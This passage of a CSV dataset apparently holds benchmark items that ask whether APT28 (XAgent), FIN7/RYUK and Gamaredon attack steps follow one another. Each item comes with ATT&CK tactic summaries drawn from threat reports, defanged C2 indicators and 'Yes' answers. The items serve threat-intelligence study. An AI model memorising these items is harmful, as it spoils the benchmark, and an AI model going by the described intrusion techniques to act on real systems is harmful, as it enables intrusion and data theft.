Exfiltration: The CTI report describes the use of the msgPacket structure for exfiltrating information to the C&C server, such as screenshots, passwords, files, and more. The data is encrypted with RC4 and sent in a POST request to the C&C server.
Others: The CTI report provides an overview of the APT28 group's targeting of Mac OS X users with the XAgent malware, highlighting the need for organizations to address computer security across all operating systems. Bitdefender, the CTI vendor, emphasizes the importance of unified security measures to prevent determined attackers from exploiting devices and networks.",Yes,Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web
987,228,228-Collection-T1005-Data from Local System,"After gathering system information, such as IOPlatformUUID and process list through the InfoOS module in the Discovery phase, is it likely that the FileSystem module within XAgent will be used to find, delete, execute, or create files in the Collection phase?","Collection: The FileSystem module within XAgent is used for file management, including finding, deleting, executing, and creating files. The CameraShot module, although not implemented, suggests an intention to capture images, potentially for data collection purposes.","Initial Access: The CTI report details an attack flow initiated by the APT28/Sofacy group using a Mac OS X Trojan named 'Komplex'. The attack begins with the Komplex Binder, which is an executable named 'roskosmos_2015-2025.app'. Its primary function is to save a second payload, the dropper, on the system and open a decoy PDF file. The Komplex Dropper's main role is to drop the final payload, ensuring persistence on the infected system by creating directories and modifying file permissions. The final payload, the Komplex Payload, is responsible for downloading and executing files as directed by the C&C servers. The report suggests that the XAgent malware is likely distributed via the Komplex malware.
Execution: The CTI report describes the initialization of the XAgent component's main module, BootXLoader, which checks for debugger presence and waits for internet connectivity before initializing communication with C&C servers. The MainHandler module starts and manages C&C commands and spying modules.
Persistence: The report indicates that the Komplex Dropper ensures persistence on the infected system by creating directories and modifying file permissions. Additionally, the Launcher module within XAgent is responsible for generating the malware's file path on the infected system and re-executing itself. The malware is located in a random directory within the '<UserHomedir>/Library/Assistants/.local/' path, with both the directory and filename picked from hardcoded lists.
Defense Evasion: The CTI report mentions that the XAgent component checks for the presence of a debugger during its initialization process and exits if one is found, as a means of defense evasion. Additionally, the Komplex Binder opens a decoy PDF file to distract the user while the actual payload is being executed.
Credential Access: The Password module within XAgent is used to obtain passwords from Firefox browser profiles, which are then saved to a file to be sent to the C&C servers.
Discovery: The InfoOS module within XAgent gathers information from the infected computer, such as IOPlatformUUID, process list, and operating system version. The RemoteShell module lists installed applications and iPhone backups.
Command and Control: The CTI report details the communication process between the XAgent malware and the C&C servers. It starts by selecting a C&C server from a hardcoded list, sends a hello message, and then starts two main communication threads: one for receiving commands and one for sending data. The HTTPChannel module is used for continuous communication with the C&C server, receiving commands, and sending stolen data.
Exfiltration: The CTI report describes the use of the msgPacket structure for exfiltrating information to the C&C server, such as screenshots, passwords, files, and more. The data is encrypted with RC4 and sent in a POST request to the C&C server.
Others: The CTI report provides an overview of the APT28 group's targeting of Mac OS X users with the XAgent malware, highlighting the need for organizations to address computer security across all operating systems. Bitdefender, the CTI vendor, emphasizes the importance of unified security measures to prevent determined attackers from exploiting devices and networks.",Yes,Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web
989,228,228-Exfiltration-T1041-Exfiltration Over C2 Channel,"Before exfiltrating information to the C&C server using the msgPacket structure, encrypting the data with RC4, and sending it in a POST request, is it likely that XAgent will establish communication with the C&C server by sending a hello message and starting communication threads to manage incoming commands and outgoing data?","Exfiltration: The CTI report describes the use of the msgPacket structure for exfiltrating information to the C&C server, such as screenshots, passwords, files, and more. The data is encrypted with RC4 and sent in a POST request to the C&C server.","Initial Access: The CTI report details an attack flow initiated by the APT28/Sofacy group using a Mac OS X Trojan named 'Komplex'. The attack begins with the Komplex Binder, which is an executable named 'roskosmos_2015-2025.app'. Its primary function is to save a second payload, the dropper, on the system and open a decoy PDF file. The Komplex Dropper's main role is to drop the final payload, ensuring persistence on the infected system by creating directories and modifying file permissions. The final payload, the Komplex Payload, is responsible for downloading and executing files as directed by the C&C servers. The report suggests that the XAgent malware is likely distributed via the Komplex malware.
Execution: The CTI report describes the initialization of the XAgent component's main module, BootXLoader, which checks for debugger presence and waits for internet connectivity before initializing communication with C&C servers. The MainHandler module starts and manages C&C commands and spying modules.
Persistence: The report indicates that the Komplex Dropper ensures persistence on the infected system by creating directories and modifying file permissions. Additionally, the Launcher module within XAgent is responsible for generating the malware's file path on the infected system and re-executing itself. The malware is located in a random directory within the '<UserHomedir>/Library/Assistants/.local/' path, with both the directory and filename picked from hardcoded lists.
Defense Evasion: The CTI report mentions that the XAgent component checks for the presence of a debugger during its initialization process and exits if one is found, as a means of defense evasion. Additionally, the Komplex Binder opens a decoy PDF file to distract the user while the actual payload is being executed.
Credential Access: The Password module within XAgent is used to obtain passwords from Firefox browser profiles, which are then saved to a file to be sent to the C&C servers.
Discovery: The InfoOS module within XAgent gathers information from the infected computer, such as IOPlatformUUID, process list, and operating system version. The RemoteShell module lists installed applications and iPhone backups.
Collection: The FileSystem module within XAgent is used for file management, including finding, deleting, executing, and creating files. The CameraShot module, although not implemented, suggests an intention to capture images, potentially for data collection purposes.
Command and Control: The CTI report details the communication process between the XAgent malware and the C&C servers. It starts by selecting a C&C server from a hardcoded list, sends a hello message, and then starts two main communication threads: one for receiving commands and one for sending data. The HTTPChannel module is used for continuous communication with the C&C server, receiving commands, and sending stolen data.
Others: The CTI report provides an overview of the APT28 group's targeting of Mac OS X users with the XAgent malware, highlighting the need for organizations to address computer security across all operating systems. Bitdefender, the CTI vendor, emphasizes the importance of unified security measures to prevent determined attackers from exploiting devices and networks.",Yes,Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web
993,229,229-Execution-T1106-Native API,"After gaining initial access through a phishing email that delivered a ZIP file containing a VBS script to drop a JavaScript backdoor, is it likely that the attacker will use the CARBANAK RAT to establish a connection with a Command-and-Control server before performing privilege escalation operations such as using RunPsExec to deploy a PowerShell RAT?","Execution: The execution phase involved the deployment of a JavaScript backdoor, which connected to the domain sephardimension[.]com. The backdoor was used to install the CARBANAK RAT on the domain controllers of the victim network. An obfuscated script was downloaded and executed, loading a DLL file in memory and executing it through reflection methods. The CARBANAK RAT then established a connection with a Command-and-Control server at 170.130.55[.]85:443 to download the malware configuration file anunak_config.","Initial Access: The initial access to the victim's network was achieved through a phishing email disguised as a communication from UPS. The email contained a link that redirected the victim to a SharePoint URL, which subsequently downloaded a ZIP file named ""Data.zip"". This file included a VBS script that dropped another script, launching a JavaScript backdoor on the victim's machine. This method of using a VBS script to drop JavaScript is a known technique employed by FIN7 and similar groups.
Privilege Escalation: The threat actor performed typical escalation attempts in the Active Directory from the compromised client. After ensuring admin privileges, the attacker used RunPsExec against several clients and servers to install a second malicious code, a PowerShell RAT. This RAT connected to the domain hxxps://besaintegration[.]com/gate and included functions to retrieve basic system information and manage arbitrary commands as background jobs.
Discovery: The attacker deployed Cobalt Strike on the network and began reconnaissance and data discovery. This stage of the attack lasted about a week and was conducted from a completely different infrastructure than the first two stages.
Collection: During the discovery stage, the attacker exfiltrated data from the victim network using the SmartFTP Client, which connected to an IP address controlled by the attacker. The names of some of the files exfiltrated were found in the file ""Unlocker-List.txt"", part of the IObit Unlocker software installed by the attacker.
Command and Control: The CARBANAK RAT, once installed, would beacon to the Command-and-Control server at 170.130.55[.]85:443. Additionally, the PowerShell RAT communicated with the domain hxxps://besaintegration[.]com/gate.
Exfiltration: The exfiltration of data was performed using the SmartFTP Client, which connected to an IP address under the attacker's control. The data theft occurred during the third stage of the attack.
Impact: The RYUK ransomware was deployed a week after the attacker began reconnaissance of the network and exfiltrated the desired data. The ransomware was deployed using both manual and scripted methods, including a batch file to disable protections and security software, and remote code execution was achieved using remote WMI command execution and PsExec.",Yes,blog.truesec.com-Collaboration between FIN7 and the RYUK group a Truesec Investigation
995,229,229-Command and Control-T1071-Application Layer Protocol,"After the attacker performed reconnaissance and data discovery using Cobalt Strike from separate infrastructure, is it likely that the CARBANAK RAT beaconed to the Command-and-Control server and the PowerShell RAT communicated with the domain hxxps://besaintegration[.]com/gate before data exfiltration was executed using the SmartFTP Client?","Command and Control: The CARBANAK RAT, once installed, would beacon to the Command-and-Control server at 170.130.55[.]85:443. Additionally, the PowerShell RAT communicated with the domain hxxps://besaintegration[.]com/gate.","Initial Access: The initial access to the victim's network was achieved through a phishing email disguised as a communication from UPS. The email contained a link that redirected the victim to a SharePoint URL, which subsequently downloaded a ZIP file named ""Data.zip"". This file included a VBS script that dropped another script, launching a JavaScript backdoor on the victim's machine. This method of using a VBS script to drop JavaScript is a known technique employed by FIN7 and similar groups.
Execution: The execution phase involved the deployment of a JavaScript backdoor, which connected to the domain sephardimension[.]com. The backdoor was used to install the CARBANAK RAT on the domain controllers of the victim network. An obfuscated script was downloaded and executed, loading a DLL file in memory and executing it through reflection methods. The CARBANAK RAT then established a connection with a Command-and-Control server at 170.130.55[.]85:443 to download the malware configuration file anunak_config.
Privilege Escalation: The threat actor performed typical escalation attempts in the Active Directory from the compromised client. After ensuring admin privileges, the attacker used RunPsExec against several clients and servers to install a second malicious code, a PowerShell RAT. This RAT connected to the domain hxxps://besaintegration[.]com/gate and included functions to retrieve basic system information and manage arbitrary commands as background jobs.
Discovery: The attacker deployed Cobalt Strike on the network and began reconnaissance and data discovery. This stage of the attack lasted about a week and was conducted from a completely different infrastructure than the first two stages.
Collection: During the discovery stage, the attacker exfiltrated data from the victim network using the SmartFTP Client, which connected to an IP address controlled by the attacker. The names of some of the files exfiltrated were found in the file ""Unlocker-List.txt"", part of the IObit Unlocker software installed by the attacker.
Exfiltration: The exfiltration of data was performed using the SmartFTP Client, which connected to an IP address under the attacker's control. The data theft occurred during the third stage of the attack.
Impact: The RYUK ransomware was deployed a week after the attacker began reconnaissance of the network and exfiltrated the desired data. The ransomware was deployed using both manual and scripted methods, including a batch file to disable protections and security software, and remote code execution was achieved using remote WMI command execution and PsExec.",Yes,blog.truesec.com-Collaboration between FIN7 and the RYUK group a Truesec Investigation
997,229,229-Impact-T1486-Data Encrypted for Impact,"After exfiltrating data from the victim network using the SmartFTP Client during the Collection phase, is it likely that the RYUK ransomware would be deployed a week later using both manual and scripted methods, which included remote code execution through WMI command execution and PsExec during the Impact phase?","Impact: The RYUK ransomware was deployed a week after the attacker began reconnaissance of the network and exfiltrated the desired data. The ransomware was deployed using both manual and scripted methods, including a batch file to disable protections and security software, and remote code execution was achieved using remote WMI command execution and PsExec.","Initial Access: The initial access to the victim's network was achieved through a phishing email disguised as a communication from UPS. The email contained a link that redirected the victim to a SharePoint URL, which subsequently downloaded a ZIP file named ""Data.zip"". This file included a VBS script that dropped another script, launching a JavaScript backdoor on the victim's machine. This method of using a VBS script to drop JavaScript is a known technique employed by FIN7 and similar groups.
Execution: The execution phase involved the deployment of a JavaScript backdoor, which connected to the domain sephardimension[.]com. The backdoor was used to install the CARBANAK RAT on the domain controllers of the victim network. An obfuscated script was downloaded and executed, loading a DLL file in memory and executing it through reflection methods. The CARBANAK RAT then established a connection with a Command-and-Control server at 170.130.55[.]85:443 to download the malware configuration file anunak_config.
Privilege Escalation: The threat actor performed typical escalation attempts in the Active Directory from the compromised client. After ensuring admin privileges, the attacker used RunPsExec against several clients and servers to install a second malicious code, a PowerShell RAT. This RAT connected to the domain hxxps://besaintegration[.]com/gate and included functions to retrieve basic system information and manage arbitrary commands as background jobs.
Discovery: The attacker deployed Cobalt Strike on the network and began reconnaissance and data discovery. This stage of the attack lasted about a week and was conducted from a completely different infrastructure than the first two stages.
Collection: During the discovery stage, the attacker exfiltrated data from the victim network using the SmartFTP Client, which connected to an IP address controlled by the attacker. The names of some of the files exfiltrated were found in the file ""Unlocker-List.txt"", part of the IObit Unlocker software installed by the attacker.
Command and Control: The CARBANAK RAT, once installed, would beacon to the Command-and-Control server at 170.130.55[.]85:443. Additionally, the PowerShell RAT communicated with the domain hxxps://besaintegration[.]com/gate.
Exfiltration: The exfiltration of data was performed using the SmartFTP Client, which connected to an IP address under the attacker's control. The data theft occurred during the third stage of the attack.",Yes,blog.truesec.com-Collaboration between FIN7 and the RYUK group a Truesec Investigation
998,229,229-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After deploying Cobalt Strike for reconnaissance and data discovery from a different infrastructure, is it likely that the attacker would connect to an IP address controlled by them using the SmartFTP Client to exfiltrate data during the third stage of the attack?","Exfiltration: The exfiltration of data was performed using the SmartFTP Client, which connected to an IP address under the attacker's control. The data theft occurred during the third stage of the attack.","Initial Access: The initial access to the victim's network was achieved through a phishing email disguised as a communication from UPS. The email contained a link that redirected the victim to a SharePoint URL, which subsequently downloaded a ZIP file named ""Data.zip"". This file included a VBS script that dropped another script, launching a JavaScript backdoor on the victim's machine. This method of using a VBS script to drop JavaScript is a known technique employed by FIN7 and similar groups.
Execution: The execution phase involved the deployment of a JavaScript backdoor, which connected to the domain sephardimension[.]com. The backdoor was used to install the CARBANAK RAT on the domain controllers of the victim network. An obfuscated script was downloaded and executed, loading a DLL file in memory and executing it through reflection methods. The CARBANAK RAT then established a connection with a Command-and-Control server at 170.130.55[.]85:443 to download the malware configuration file anunak_config.
Privilege Escalation: The threat actor performed typical escalation attempts in the Active Directory from the compromised client. After ensuring admin privileges, the attacker used RunPsExec against several clients and servers to install a second malicious code, a PowerShell RAT. This RAT connected to the domain hxxps://besaintegration[.]com/gate and included functions to retrieve basic system information and manage arbitrary commands as background jobs.
Discovery: The attacker deployed Cobalt Strike on the network and began reconnaissance and data discovery. This stage of the attack lasted about a week and was conducted from a completely different infrastructure than the first two stages.
Collection: During the discovery stage, the attacker exfiltrated data from the victim network using the SmartFTP Client, which connected to an IP address controlled by the attacker. The names of some of the files exfiltrated were found in the file ""Unlocker-List.txt"", part of the IObit Unlocker software installed by the attacker.
Command and Control: The CARBANAK RAT, once installed, would beacon to the Command-and-Control server at 170.130.55[.]85:443. Additionally, the PowerShell RAT communicated with the domain hxxps://besaintegration[.]com/gate.
Impact: The RYUK ransomware was deployed a week after the attacker began reconnaissance of the network and exfiltrated the desired data. The ransomware was deployed using both manual and scripted methods, including a batch file to disable protections and security software, and remote code execution was achieved using remote WMI command execution and PsExec.",Yes,blog.truesec.com-Collaboration between FIN7 and the RYUK group a Truesec Investigation
1000,229,229-Privilege Escalation-T1078-Valid Accounts,"After executing the CARBANAK RAT to establish connections with the C2 server and deploying secondary malware through obfuscated scripts, is it likely that the attacker will later use RunPsExec to install a PowerShell RAT and gain elevated privileges before deploying reconnaissance tools like Cobalt Strike for network discovery?","Privilege Escalation: The threat actor performed typical escalation attempts in the Active Directory from the compromised client. After ensuring admin privileges, the attacker used RunPsExec against several clients and servers to install a second malicious code, a PowerShell RAT. This RAT connected to the domain hxxps://besaintegration[.]com/gate and included functions to retrieve basic system information and manage arbitrary commands as background jobs.","Initial Access: The initial access to the victim's network was achieved through a phishing email disguised as a communication from UPS. The email contained a link that redirected the victim to a SharePoint URL, which subsequently downloaded a ZIP file named ""Data.zip"". This file included a VBS script that dropped another script, launching a JavaScript backdoor on the victim's machine. This method of using a VBS script to drop JavaScript is a known technique employed by FIN7 and similar groups.
Execution: The execution phase involved the deployment of a JavaScript backdoor, which connected to the domain sephardimension[.]com. The backdoor was used to install the CARBANAK RAT on the domain controllers of the victim network. An obfuscated script was downloaded and executed, loading a DLL file in memory and executing it through reflection methods. The CARBANAK RAT then established a connection with a Command-and-Control server at 170.130.55[.]85:443 to download the malware configuration file anunak_config.
Discovery: The attacker deployed Cobalt Strike on the network and began reconnaissance and data discovery. This stage of the attack lasted about a week and was conducted from a completely different infrastructure than the first two stages.
Collection: During the discovery stage, the attacker exfiltrated data from the victim network using the SmartFTP Client, which connected to an IP address controlled by the attacker. The names of some of the files exfiltrated were found in the file ""Unlocker-List.txt"", part of the IObit Unlocker software installed by the attacker.
Command and Control: The CARBANAK RAT, once installed, would beacon to the Command-and-Control server at 170.130.55[.]85:443. Additionally, the PowerShell RAT communicated with the domain hxxps://besaintegration[.]com/gate.
Exfiltration: The exfiltration of data was performed using the SmartFTP Client, which connected to an IP address under the attacker's control. The data theft occurred during the third stage of the attack.
Impact: The RYUK ransomware was deployed a week after the attacker began reconnaissance of the network and exfiltrated the desired data. The ransomware was deployed using both manual and scripted methods, including a batch file to disable protections and security software, and remote code execution was achieved using remote WMI command execution and PsExec.",Yes,blog.truesec.com-Collaboration between FIN7 and the RYUK group a Truesec Investigation
1001,229,229-Privilege Escalation-T1543-Create or Modify System Process,"After achieving execution by deploying a JavaScript backdoor and installing the CARBANAK RAT, is it likely that the threat actor will ensure admin privileges on the victim's Active Directory before using RunPsExec to install a PowerShell RAT for privilege escalation?","Privilege Escalation: The threat actor performed typical escalation attempts in the Active Directory from the compromised client. After ensuring admin privileges, the attacker used RunPsExec against several clients and servers to install a second malicious code, a PowerShell RAT. This RAT connected to the domain hxxps://besaintegration[.]com/gate and included functions to retrieve basic system information and manage arbitrary commands as background jobs.","Initial Access: The initial access to the victim's network was achieved through a phishing email disguised as a communication from UPS. The email contained a link that redirected the victim to a SharePoint URL, which subsequently downloaded a ZIP file named ""Data.zip"". This file included a VBS script that dropped another script, launching a JavaScript backdoor on the victim's machine. This method of using a VBS script to drop JavaScript is a known technique employed by FIN7 and similar groups.
Execution: The execution phase involved the deployment of a JavaScript backdoor, which connected to the domain sephardimension[.]com. The backdoor was used to install the CARBANAK RAT on the domain controllers of the victim network. An obfuscated script was downloaded and executed, loading a DLL file in memory and executing it through reflection methods. The CARBANAK RAT then established a connection with a Command-and-Control server at 170.130.55[.]85:443 to download the malware configuration file anunak_config.
Discovery: The attacker deployed Cobalt Strike on the network and began reconnaissance and data discovery. This stage of the attack lasted about a week and was conducted from a completely different infrastructure than the first two stages.
Collection: During the discovery stage, the attacker exfiltrated data from the victim network using the SmartFTP Client, which connected to an IP address controlled by the attacker. The names of some of the files exfiltrated were found in the file ""Unlocker-List.txt"", part of the IObit Unlocker software installed by the attacker.
Command and Control: The CARBANAK RAT, once installed, would beacon to the Command-and-Control server at 170.130.55[.]85:443. Additionally, the PowerShell RAT communicated with the domain hxxps://besaintegration[.]com/gate.
Exfiltration: The exfiltration of data was performed using the SmartFTP Client, which connected to an IP address under the attacker's control. The data theft occurred during the third stage of the attack.
Impact: The RYUK ransomware was deployed a week after the attacker began reconnaissance of the network and exfiltrated the desired data. The ransomware was deployed using both manual and scripted methods, including a batch file to disable protections and security software, and remote code execution was achieved using remote WMI command execution and PsExec.",Yes,blog.truesec.com-Collaboration between FIN7 and the RYUK group a Truesec Investigation
1019,230,230-Command and Control-T1071-Application Layer Protocol,"After searching for sensitive documents across local and network drives and capturing screenshots every minute during data collection, is it likely that Gamaredon's malware will use HTTP and HTTPS protocols for command and control communication before transferring harvested documents to the C&C server for exfiltration?",Command and Control: The group's malware uses both HTTP and HTTPS for command and control.,"Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.
Defense Evasion: Gamaredon uses obfuscated files or information, modifies registry keys to deactivate security mechanisms in Microsoft Office related to macros, and employs code signing with valid certificates. They also deobfuscate and decrypt strings in their modules and add remote templates to documents sent to targets. The C# compiler module contains an obfuscated downloader that is compiled using csc.exe and then executed.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.
Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",Yes,Gamaredon group grows its game _ WeLiveSecurity
1022,230,230-Persistence-T1547-Boot or Logon Autostart Execution,"After relying on user execution of malicious email attachments for the initial compromise and executing payloads from C&C servers, is the Gamaredon group likely to schedule tasks to ensure modules execute at every reboot before employing obfuscated files and modifying registry keys to deactivate Microsoft Office security mechanisms for defense evasion?","Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.","Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Defense Evasion: Gamaredon uses obfuscated files or information, modifies registry keys to deactivate security mechanisms in Microsoft Office related to macros, and employs code signing with valid certificates. They also deobfuscate and decrypt strings in their modules and add remote templates to documents sent to targets. The C# compiler module contains an obfuscated downloader that is compiled using csc.exe and then executed.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.
Command and Control: The group's malware uses both HTTP and HTTPS for command and control.
Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",Yes,Gamaredon group grows its game _ WeLiveSecurity
1024,230,230-Collection-T1005-Data from Local System,"After injecting malicious macros into all accessible Word and Excel documents for lateral movement via compromised systems, is it likely that Gamaredon’s malware will search for sensitive documents during the collection phase?","Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.","Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.
Defense Evasion: Gamaredon uses obfuscated files or information, modifies registry keys to deactivate security mechanisms in Microsoft Office related to macros, and employs code signing with valid certificates. They also deobfuscate and decrypt strings in their modules and add remote templates to documents sent to targets. The C# compiler module contains an obfuscated downloader that is compiled using csc.exe and then executed.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Command and Control: The group's malware uses both HTTP and HTTPS for command and control.
Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",Yes,Gamaredon group grows its game _ WeLiveSecurity
1025,230,230-Collection-T1025-Data from Removable Media,"After using their backdoors to list interesting files, such as Office documents, is Gamaredon likely to scan all drives, including removable drives and network shares mounted as drives, for sensitive data before automatically uploading the harvested documents to the C&C server?","Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.","Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.
Defense Evasion: Gamaredon uses obfuscated files or information, modifies registry keys to deactivate security mechanisms in Microsoft Office related to macros, and employs code signing with valid certificates. They also deobfuscate and decrypt strings in their modules and add remote templates to documents sent to targets. The C# compiler module contains an obfuscated downloader that is compiled using csc.exe and then executed.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Command and Control: The group's malware uses both HTTP and HTTPS for command and control.
Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",Yes,Gamaredon group grows its game _ WeLiveSecurity
1026,230,230-Collection-T1039-Data from Network Shared Drive,"After inserting malicious macros into existing documents for persistence and using a backdoor to list interesting files such as Office documents during discovery, is it likely that Gamaredon's malware will scan all drives, including network shared drives, for sensitive data as part of data collection?","Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.","Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.
Defense Evasion: Gamaredon uses obfuscated files or information, modifies registry keys to deactivate security mechanisms in Microsoft Office related to macros, and employs code signing with valid certificates. They also deobfuscate and decrypt strings in their modules and add remote templates to documents sent to targets. The C# compiler module contains an obfuscated downloader that is compiled using csc.exe and then executed.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Command and Control: The group's malware uses both HTTP and HTTPS for command and control.
Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",Yes,Gamaredon group grows its game _ WeLiveSecurity
